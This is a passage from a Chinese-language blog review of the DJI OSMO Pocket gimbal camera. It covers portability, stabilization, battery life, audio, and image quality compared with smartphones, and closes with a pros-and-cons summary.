时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]